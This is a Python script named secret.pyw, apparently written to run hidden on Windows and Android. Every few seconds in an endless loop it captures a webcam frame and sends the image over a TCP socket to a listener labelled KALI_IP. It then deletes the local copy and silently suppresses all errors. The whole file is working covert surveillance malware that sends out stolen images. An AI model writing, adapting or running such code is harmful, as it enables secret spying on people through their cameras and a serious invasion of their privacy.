# File name → secret.pyw

import cv2
import socket
import time
import os
import platform

KALI_IP = "192.168.1..."
PORT = 9999
ALSO_SAVE_ON_WINDOWS = False
CAPTURE_FILENAME = "capture.png"
INTERVAL_SECONDS = 5
IMAGE_FORMAT = "png"

def get_save_extension():
    if IMAGE_FORMAT.lower() == "jpeg" or IMAGE_FORMAT.lower() == "jpg":
        return ".jpg"
    else:
        return ".png"

def get_capture_filename():
    return f"capture{get_save_extension()}"

def send_file_to_server(filename, server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        
        with open(filename, "rb") as file_handle:
            sock.sendfile(file_handle)
        
        sock.close()
        return True
        
    except Exception:
        return False

def save_image_to_termux(image, filename):
    try:
        if platform.system() == 'Android' or os.path.exists('/data/data/com.termux'):
            termux_path = "/storage/emulated/0/Pictures/"
            full_path = os.path.join(termux_path, filename)
            cv2.imwrite(full_path, image)
            print(f"Image saved to Termux: {full_path}")
            return full_path
        else:
            cv2.imwrite(filename, image)
            return filename
    except Exception:
        cv2.imwrite(filename, image)
        return filename

def capture_image():
    camera = cv2.VideoCapture(0)
    
    if not camera.isOpened():
        return None
    
    time.sleep(1.2)
    success, frame = camera.read()
    camera.release()
    
    if success:
        return frame
    return None

while True:
    try:
        filename = get_capture_filename()
        
        frame = capture_image()
        
        if frame is not None:
            if IMAGE_FORMAT.lower() == "jpeg" or IMAGE_FORMAT.lower() == "jpg":
                cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            else:
                cv2.imwrite(filename, frame, [cv2.IMWRITE_PNG_COMPRESSION, 3])
            
            if ALSO_SAVE_ON_WINDOWS and platform.system() == 'Windows':
                desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
                timestamp = int(time.time())
                save_path = os.path.join(desktop_path, f"capture_{timestamp}{get_save_extension()}")
                cv2.imwrite(save_path, frame)
                print(f"Debug copy saved to: {save_path}")
            
            termux_path = save_image_to_termux(frame, filename)
            
            success = send_file_to_server(filename, KALI_IP, PORT)
            
            try:
                os.remove(filename)
                print(f"Local file {filename} deleted.")
            except:
                pass

    except Exception as e:
        pass

    time.sleep(INTERVAL_SECONDS)
